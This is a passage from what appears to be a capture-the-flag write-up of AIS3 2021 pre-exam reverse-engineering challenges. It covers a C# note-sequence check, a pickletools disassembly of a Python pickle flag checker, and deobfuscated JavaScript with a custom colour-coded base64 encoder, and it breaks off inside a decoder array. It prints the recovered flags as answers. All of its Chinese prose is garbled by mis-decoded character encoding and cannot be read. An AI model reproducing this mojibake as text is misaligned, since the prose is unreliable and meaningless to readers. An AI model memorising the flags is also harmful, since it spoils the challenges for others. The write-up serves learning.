  List&lt;<span style=color:#66d9ef>int</span>&gt; list2 = <span style=color:#66d9ef>new</span> List&lt;<span style=color:#66d9ef>int</span>&gt; {
    <span style=color:#ae81ff>0</span>,  -<span style=color:#ae81ff>3</span>,  <span style=color:#ae81ff>0</span>, -<span style=color:#ae81ff>1</span>,  <span style=color:#ae81ff>0</span>,  <span style=color:#ae81ff>1</span>,  <span style=color:#ae81ff>1</span>,  <span style=color:#ae81ff>0</span>,  <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>0</span>, -<span style=color:#ae81ff>5</span>,  <span style=color:#ae81ff>0</span>,  <span style=color:#ae81ff>1</span>,  <span style=color:#ae81ff>0</span>
  };
  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i = <span style=color:#ae81ff>0</span>; i &lt; <span style=color:#ae81ff>14</span>; i++)
  {
    <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.notes[i] + <span style=color:#66d9ef>this</span>.notes[(i + <span style=color:#ae81ff>1</span>) % <span style=color:#ae81ff>14</span>] != list[i])
    {
      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
    }
    <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.notes[i] - <span style=color:#66d9ef>this</span>.notes[(i + <span style=color:#ae81ff>1</span>) % <span style=color:#ae81ff>14</span>] != list2[i])
    {
      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
    }
  }
  <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
}
</code></pre></div><p>è§£å®Œè¯ç«‹å¾Œç™¼ç¾é€™14å€‹éŸ³æ˜¯</p><p><code>C#, C#, G#, G#, A#, A#, G#, F#, F#, F, F, D#, D#, C#</code></p><p>å½ˆå®Œå°æ˜Ÿæ˜Ÿä¹‹å¾Œå°±è·³å‡ºä¸€å€‹è¦–çª—çµ¦ä½ Flagäº†</p><p><code>AIS3{7wink1e_tw1nkl3_l1ttl3_574r_1n_C_5h4rp}</code></p><hr><h2 id=peekora>ğŸ°PeekorağŸ¥’<a hidden class=anchor aria-hidden=true href=#peekora>#</a></h2><p>é¡Œç›®æ˜¯ä¸€å€‹Python Pickleæª”ï¼š<code>flag_checker.pkl</code></p><p>å¯ä»¥ç”¨ <code>python -m pickle flag_checker.pkl</code> åŸ·è¡Œå®ƒ</p><p>ä¸¦ä¸”å¦‚åå­—æ‰€ç¤º, æˆåŠŸè¼¸å…¥flagå°±æœƒprint(&ldquo;Correct!")</p><p>è¼¸å…¥éŒ¯èª¤çš„è©±æœƒç›´æ¥exit, ä¸è®“ä½ ç”¨pickleæŠŠå®ƒloadå®Œã€‚</p><p>åªèƒ½ä¹–ä¹–åšéœæ…‹åˆ†æäº†</p><p><code>python -m pickletools -a flag_checker.pkl</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt>    0: c    GLOBAL     &#39;__builtin__ input&#39; Push a global object (module.attr) on the stack.
   19: (    MARK                           Push markobject onto the stack.
   20: S        STRING     &#39;FLAG: &#39;        Push a Python string object.
   30: t        TUPLE      (MARK at 19)    Build a tuple out of the topmost stack slice, after markobject.
   31: R    REDUCE                         Push an object built from a callable and an argument tuple.
   32: p    PUT        0                   Store the stack top into the memo.  The stack is not popped.
   35: 0    POP                            Discard the top stack item, shrinking the stack by one item.
   36: c    GLOBAL     &#39;__builtin__ getattr&#39; Push a global object (module.attr) on the stack.
   57: p    PUT        1                     Store the stack top into the memo.  The stack is not popped.
   60: 0    POP                              Discard the top stack item, shrinking the stack by one item.
   61: g    GET        1                     Read an object from the memo and push it on the stack.
   64: (    MARK                             Push markobject onto the stack.
   65: (        MARK                         Push markobject onto the stack.
   66: c            GLOBAL     &#39;__builtin__ exit&#39; Push a global object (module.attr) on the stack.
   84: c            GLOBAL     &#39;__builtin__ str&#39;  Push a global object (module.attr) on the stack.
  101: l            LIST       (MARK at 65)       Build a list out of the topmost stack slice, after markobject.
  102: S        STRING     &#39;__getitem__&#39;          Push a Python string object.
  117: t        TUPLE      (MARK at 64)           Build a tuple out of the topmost stack slice, after markobject.
  118: R    REDUCE                                Push an object built from a callable and an argument tuple.
  119: p    PUT        2                          Store the stack top into the memo.  The stack is not popped.
  122: 0    POP                                   Discard the top stack item, shrinking the stack by one item.
  123: g    GET        2                          Read an object from the memo and push it on the stack.
  126: (    MARK                                  Push markobject onto the stack.
  127: g        GET        1                      Read an object from the memo and push it on the stack.
  130: (        MARK                              Push markobject onto the stack.
  131: g            GET        0                  Read an object from the memo and push it on the stack.
  134: S            STRING     &#39;startswith&#39;       Push a Python string object.
  148: t            TUPLE      (MARK at 130)      Build a tuple out of the topmost stack slice, after markobject.
  149: R        REDUCE                            Push an object built from a callable and an argument tuple.
  150: (        MARK                              Push markobject onto the stack.
  151: S            STRING     &#39;AIS3{&#39;            Push a Python string object.
  160: t            TUPLE      (MARK at 150)      Build a tuple out of the topmost stack slice, after markobject.
  161: R        REDUCE                            Push an object built from a callable and an argument tuple.
  162: t        TUPLE      (MARK at 126)          Build a tuple out of the topmost stack slice, after markobject.
  163: R    REDUCE                                Push an object built from a callable and an argument tuple.
# ä»¥ä¸‹ç•¥...
</code></pre></div><p>æ²’ä»€éº¼å¥½èªªçš„ï¼Œå°±æ˜¯å¤§éƒ¨åˆ†ç›´è­¯èªè¨€åŸ·è¡ŒæœŸçš„æ¶æ§‹ï¼Œç”¨stackå‘¼å«å‡½æ•¸</p><p>pickletools æœ‰å¹«å¿™æŠŠæ®µè½indentçœŸçš„æ˜¯å¹«äº†å¤§å¿™ã€‚</p><p>æ¥ä¸‹ä¾†å°±è¦ä½¿ç”¨<em>è¶…å‡¡çš„æ„å¿—åŠ›</em>ç›¯è‘—å®ƒçœ‹ï¼Œ</p><p>ç„¶å¾Œæ‚Ÿå‡ºflagæœƒç¶“éä»¥ä¸‹çš„testï¼š</p><ul><li>flag.startswith(&lsquo;AIS3{')</li><li>flag.endswith('}')</li><li>flag[6] == &lsquo;A&rsquo;</li><li>flag[9] == &lsquo;j&rsquo;</li><li>flag[11] == &lsquo;p&rsquo;</li><li>flag[14] == flag[9]</li><li>flag[5] == &rsquo;d&rsquo;</li><li>flag[10] == &lsquo;z&rsquo;</li><li>flag[12] == &lsquo;h&rsquo;</li><li>flag[13] == flag[1]</li><li>flag[8] == &lsquo;w&rsquo;</li><li>flag[7] == &rsquo;m'</li></ul><p>æ‰€ä»¥æœ€å¾Œæ‹¼å‡ºä¾†çš„flagæ˜¯</p><p><code>AIS3{dAmwjzphIj}</code></p><hr><h2 id=colors>Colors<a hidden class=anchor aria-hidden=true href=#colors>#</a></h2><p>é¡Œç›®é€£çµæ˜¯é€™å€‹ç¶²é ï¼Œé¦¬ä¸Šæœ‰ä¸å¥½çš„é æ„Ÿæœƒæ˜¯Reverse JSé¡Œ</p><figure><img loading=lazy src=/img/ais3_2021/pre_exam/colors01.png></figure><p>å‰10å€‹å­—æ¯çš„htmlé•·é€™æ¨£(å¾ˆé‡è¦ï¼Œç­‰ä¸€ä¸‹æœƒè€ƒ)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c0 r0&#34;</span>&gt;i&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c0 r0&#34;</span>&gt;n&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c0 r0&#34;</span>&gt;p&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c0 r0&#34;</span>&gt;u&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c0 r0&#34;</span>&gt;t&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c1 r0&#34;</span>&gt;s&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c1 r0&#34;</span>&gt;e&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c1 r0&#34;</span>&gt;c&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c1 r0&#34;</span>&gt;r&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c1 r0&#34;</span>&gt;e&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
&lt;<span style=color:#f92672>span</span>&gt;&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;c1 r0&#34;</span>&gt;t&lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
</code></pre></div><p>ç„¶å¾Œé¡Œç›®çš„Javascriptæœ‰åšobfuscationï¼Œæ‰€ä»¥çœŸçš„æœ‰å¤ é†œã€‚</p><p>ç¶“éä¸€äº›ç°¡åŒ–ä»¥åŠé‡æ–°å‘½åå¾Œï¼Œæœ‰é—œsecret codeçš„é‚è¼¯ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>document[<span style=color:#e6db74>&#39;addEventListener&#39;</span>](<span style=color:#e6db74>&#39;keydown&#39;</span>, <span style=color:#a6e22e>LISTENER</span>=&gt;{
    <span style=color:#66d9ef>const</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x12b963</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>f2</span>;
    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;Backspace&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xa</span>)
        <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x1e21d9</span>[<span style=color:#e6db74>&#39;textContent&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x1e21d9</span>[<span style=color:#e6db74>&#39;textContent&#39;</span>][<span style=color:#e6db74>&#39;substr&#39;</span>](<span style=color:#ae81ff>0x0</span>, <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x1e21d9</span>[<span style=color:#e6db74>&#39;textContent&#39;</span>][<span style=color:#e6db74>&#39;length&#39;</span>] <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1</span>);
    <span style=color:#66d9ef>else</span> {
        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;ArrowUp&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>(<span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>0x1</span>))
            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0x1</span>;
        <span style=color:#66d9ef>else</span> {
            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;ArrowDown&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>(<span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>0x2</span>))
                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0x1</span>;
            <span style=color:#66d9ef>else</span> {
                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;ArrowLeft&#39;</span> <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x4</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x6</span>))
                    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0x1</span>;
                <span style=color:#66d9ef>else</span> {
                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;ArrowRight&#39;</span> <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x5</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x7</span>))
                        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0x1</span>;
                    <span style=color:#66d9ef>else</span> {
                        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;b&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x8</span>)
                            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0x1</span>;
                        <span style=color:#66d9ef>else</span> {
                            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x9</span>)
                                <span style=color:#66d9ef>return</span> document[<span style=color:#e6db74>&#39;getElementsByTagName&#39;</span>](<span style=color:#e6db74>&#39;body&#39;</span>)[<span style=color:#ae81ff>0x0</span>][<span style=color:#e6db74>&#39;innerHTML&#39;</span>] <span style=color:#f92672>+=</span> <span style=color:#a6e22e>atob</span>(<span style=color:#a6e22e>b1</span>),
                                <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x1e21d9</span> <span style=color:#f92672>=</span> document[<span style=color:#e6db74>&#39;getElementById&#39;</span>](<span style=color:#e6db74>&#39;input&#39;</span>),
                                <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x1e21d9</span>[<span style=color:#e6db74>&#39;innerHTML&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#75715e>// unlock input
</span><span style=color:#75715e></span>                                document[<span style=color:#e6db74>&#39;getElementById&#39;</span>](<span style=color:#e6db74>&#39;output&#39;</span>)[<span style=color:#e6db74>&#39;innerHTML&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>atob</span>(<span style=color:#a6e22e>b2</span>)[<span style=color:#e6db74>&#39;match&#39;</span>](<span style=color:#e6db74>/(.{1,3})/g</span>)[<span style=color:#e6db74>&#39;map&#39;</span>](<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x5efa9e</span>=&gt;<span style=color:#a6e22e>TAG</span>(<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x5efa9e</span>[<span style=color:#ae81ff>0x0</span>], <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x5efa9e</span>[<span style=color:#ae81ff>0x1</span>], <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x5efa9e</span>[<span style=color:#ae81ff>0x2</span>]))[<span style=color:#e6db74>&#39;join&#39;</span>](<span style=color:#e6db74>&#39;&#39;</span>),
                                <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0x1</span>;
                            <span style=color:#66d9ef>else</span> {
                                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>][<span style=color:#e6db74>&#39;length&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x1</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>SEQ</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xa</span>)
                                    <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x1e21d9</span>[<span style=color:#e6db74>&#39;textContent&#39;</span>] <span style=color:#f92672>+=</span> String[<span style=color:#e6db74>&#39;fromCharCode&#39;</span>](<span style=color:#a6e22e>LISTENER</span>[<span style=color:#e6db74>&#39;key&#39;</span>][<span style=color:#e6db74>&#39;charCodeAt&#39;</span>]());
                                <span style=color:#66d9ef>else</span>
                                    <span style=color:#66d9ef>return</span>;
                            }
                        }
                    }
                }
            }
        }
    }
    <span style=color:#a6e22e>update</span>(<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x1e21d9</span>[<span style=color:#e6db74>&#39;textContent&#39;</span>]);
}
</code></pre></div><p>åŸºæœ¬ä¸Šå°±æ˜¯å¾EventListeneræŠ“ä½ è¼¸å…¥çš„åå€‹key</p><p>å¯ä»¥çœ‹å‡ºsecret codeæ˜¯ <strong>â†‘â†‘â†“â†“â†â†’â†â†’ba</strong></p><p>è¼¸å…¥secret codeå¾Œé‚„ä¸æ”¾éä½ ï¼š</p><figure><img loading=lazy src=/img/ais3_2021/pre_exam/colors02.png></figure><p>æ¥ä¸‹ä¾†æˆ‘å€‘å¯ä»¥è¼¸å…¥ä»»æ„å­—ä¸²ï¼Œç¶²ç«™æœƒçµ¦æˆ‘å€‘çœ‹encodeå¾Œçš„çµæœ</p><p>å¯«å‡ºdecoderå¾Œæ‡‰è©²å°±èƒ½é‚„åŸflagäº†</p><p>å…ˆä¾†çœ‹çœ‹ä»–çš„encodingé‚è¼¯ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>TAG</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>cid</span>,<span style=color:#a6e22e>rid</span>,<span style=color:#a6e22e>chr</span>)=&gt;<span style=color:#e6db74>&#39;&lt;span&gt;&lt;div\x20class=\x22c&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>cid</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;\x20r&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>rid</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;\x22&gt;&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>chr</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&lt;/div&gt;&lt;/span&gt;&#39;</span>;
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>b64</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}&#34;</span>;

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>encode</span>(<span style=color:#a6e22e>INPUT</span>) {
    <span style=color:#66d9ef>const</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x9fe181</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>f2</span>;
    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>INPUT</span>[<span style=color:#e6db74>&#39;length&#39;</span>])
        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span>;
    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>BIN</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
      , <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
      , <span style=color:#a6e22e>rest</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0</span>;
    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>INPUT</span>[<span style=color:#e6db74>&#39;length&#39;</span>]; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>)
		<span style=color:#75715e>// appends ASCII bin string for each char in input
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>BIN</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>INPUT</span>[<span style=color:#e6db74>&#39;charCodeAt&#39;</span>](<span style=color:#a6e22e>i</span>)[<span style=color:#e6db74>&#39;toString&#39;</span>](<span style=color:#ae81ff>0x2</span>)[<span style=color:#e6db74>&#39;padStart&#39;</span>](<span style=color:#ae81ff>0x8</span>, <span style=color:#e6db74>&#39;0&#39;</span>);
    <span style=color:#a6e22e>rest</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>BIN</span>[<span style=color:#e6db74>&#39;length&#39;</span>] <span style=color:#f92672>%</span> <span style=color:#a6e22e>ten</span> <span style=color:#f92672>/</span> <span style=color:#ae81ff>0x2</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1</span>;
    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>rest</span> <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0x1</span>)
		<span style=color:#75715e>// pad the bin string to a multiple of ten
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>BIN</span> <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;0&#39;</span>[<span style=color:#e6db74>&#39;repeat&#39;</span>](<span style=color:#a6e22e>ten</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>BIN</span>[<span style=color:#e6db74>&#39;length&#39;</span>] <span style=color:#f92672>%</span> <span style=color:#a6e22e>ten</span>);
	<span style=color:#75715e>// split into sections of 10 bits
</span><span style=color:#75715e></span>    <span style=color:#a6e22e>BIN</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>BIN</span>[<span style=color:#e6db74>&#39;match&#39;</span>](<span style=color:#e6db74>/(.{1,10})/g</span>);
    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>section</span> <span style=color:#66d9ef>of</span> <span style=color:#a6e22e>BIN</span>) {
		<span style=color:#75715e>// x from 0 to 1023
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> parseInt(<span style=color:#a6e22e>section</span>, <span style=color:#ae81ff>0x2</span>);
		<span style=color:#75715e>// bit 6 to 8 bit determines color
</span><span style=color:#75715e></span>		<span style=color:#75715e>// bit 9 determines ???
</span><span style=color:#75715e></span>		<span style=color:#75715e>// bit 0 to 5 determines char
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>result</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>TAG</span>(<span style=color:#a6e22e>x</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>0x6</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x7</span>, <span style=color:#a6e22e>x</span> <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>0x9</span>, <span style=color:#a6e22e>b64</span>[<span style=color:#a6e22e>x</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x3f</span>]);
    }
    <span style=color:#66d9ef>for</span> (; <span style=color:#a6e22e>rest</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x0</span>; <span style=color:#a6e22e>rest</span><span style=color:#f92672>--</span>) {
        <span style=color:#a6e22e>result</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>TAG</span>(<span style=color:#a6e22e>rest</span> <span style=color:#f92672>%</span> <span style=color:#a6e22e>eight</span>, <span style=color:#ae81ff>0x0</span>, <span style=color:#e6db74>&#39;=&#39;</span>);
    }
    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>result</span>;
}
</code></pre></div><p>æ¯äº”å€‹å­—å…ƒæœƒæŠŠAsciiå»¶ä¼¸åˆ°8-bitä¹‹å¾Œå†æ¥èµ·ä¾†ï¼Œé€™æ¨£æ˜¯ä¸€åœ˜40-bitçš„è³‡è¨Š</p><p>ç„¶å¾Œä»¥10-bitç‚ºä¸€å–®ä½ç·¨ç¢¼æˆå››å€‹å­—å…ƒ</p><p>10-bitçš„ç”¨æ³•æ˜¯ï¼š</p><ul><li>bit 0-5 å¾64å€‹å­—å…ƒé¸ä¸€ç¨®</li><li>bit 6-8 å¾8ç¨®é¡è‰²é¸ä¸€ç¨®</li><li>bit 9 ä¸çŸ¥é“åœ¨å¹¹éº»æˆ‘ä¹Ÿæ‡¶çš„å¼„æ¸…æ¥š</li></ul><p>æ¥ä¸‹ä¾†å°±æ˜¯æŠŠencoded flagçš„è³‡è¨ŠæŠ“ä¸‹ä¾†ç„¶å¾Œå¯«decoderï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>enc</span> <span style=color:#f92672>=</span> [
	<span style=color:#e6db74>&#34;04B&#34;</span>, <span style=color:#e6db74>&#34;02g&#34;</span>, <span style=color:#e6db74>&#34;03i&#34;</span>, <span style=color:#e6db74>&#34;15J&#34;</span>, <span style=color:#75715e>// 40 bits of data
</span><span style=color:#75715e></span>	<span style=color:#e6db74>&#34;066&#34;</span>, <span style=color:#e6db74>&#34;10\\&#34;</span>, <span style=color:#e6db74>&#34;03w&#34;</span>, <span style=color:#e6db74>&#34;041&#34;</span>,
	<span style=color:#e6db74>&#34;03A&#34;</span>, <span style=color:#e6db74>&#34;14j&#34;</span>, <span style=color:#e6db74>&#34;04\\&#34;</span>, <span style=color:#e6db74>&#34;141&#34;</span>,
	<span style=color:#e6db74>&#34;03g&#34;</span>, <span style=color:#e6db74>&#34;07u&#34;</span>, <span style=color:#e6db74>&#34;03i&#34;</span>, <span style=color:#e6db74>&#34;01k&#34;</span>,
	<span style=color:#e6db74>&#34;03l&#34;</span>, <span style=color:#e6db74>&#34;047&#34;</span>, <span style=color:#e6db74>&#34;06x&#34;</span>, <span style=color:#e6db74>&#34;05i&#34;</span>,
	<span style=color:#e6db74>&#34;05X&#34;</span>, <span style=color:#e6db74>&#34;01K&#34;</span>, <span style=color:#e6db74>&#34;01I&#34;</span>, <span style=color:#e6db74>&#34;04h&#34;</span>,
	<span style=color:#e6db74>&#34;05X&#34;</span>, <span style=color:#e6db74>&#34;00K&#34;</span>, <span style=color:#e6db74>&#34;14i&#34;</span>, <span style=color:#e6db74>&#34;15l&#34;</span>,
	<span style=color:#e6db74>&#34;076&#34;</span>, <span style=color:#e6db74>&#34;07f&#34;</span>, <span style=color:#e6db74>&#34;04o&#34;</span>, <span style=color:#e6db74>&#34;016&#34;</span>,
	<span style=color:#e6db74>&#34;055&#34;</span>, <span style=color:#e6db74>&#34;07K&#34;</span>, <span style=color:#e6db74>&#34;11n&#34;</span>, <span style=color:#e6db74>&#34;158&#34;</span>,
	<span style=color:#e6db74>&#34;077&#34;</span>, <span style=color:#e6db74>&#34;14B&#34;</span>, <span style=color:#e6db74>&#34;05-&#34;</span>, <span style=color:#e6db74>&#34;118&#34;</span>,
